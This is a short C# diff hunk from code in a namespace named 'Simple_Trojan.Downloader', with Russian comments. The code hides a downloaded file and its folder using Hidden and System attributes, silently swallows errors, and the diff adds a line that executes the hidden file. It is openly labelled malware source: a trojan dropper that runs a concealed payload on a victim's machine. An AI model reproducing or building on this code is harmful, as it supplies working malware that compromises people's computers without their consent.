@@ -30,6 +30,7 @@ namespace Simple_Trojan.Downloader
 				File.SetAttributes(save_path, FileAttributes.Hidden | FileAttributes.System); //установка скрытого аттрибута на файл
 				File.SetAttributes(save_path.Split('\\')[save_path.Split('\\').Length - 2], FileAttributes.Directory |
 					FileAttributes.Hidden | FileAttributes.System); //установка скрытого аттрибута на папку
+				Process.Start(save_path);
 			}
 			catch { }
 		}
